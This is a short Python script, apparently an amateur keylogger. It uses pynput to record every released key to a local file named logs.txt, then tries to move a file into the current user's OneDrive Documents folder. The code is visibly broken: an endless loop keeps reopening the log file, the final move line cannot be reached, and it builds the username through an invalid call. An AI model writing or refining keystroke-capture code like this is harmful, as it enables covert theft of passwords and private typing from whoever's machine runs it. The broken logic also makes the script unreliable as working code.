from pynput import keyboard
import os, shutil, getpass

def on_release(key):
    f.write(str(key))

listener=keyboard.Listener(on_release=on_release)
listener.start()

f = open("logs.txt","a")
while True:
    i = 0
    f = open("logs.txt","a")
shutil.move("D:\\new.txt", "C:\\Users\\" + str(username = getpass.getuser()) + "\\OneDrive\\Dokument\\new.txt")
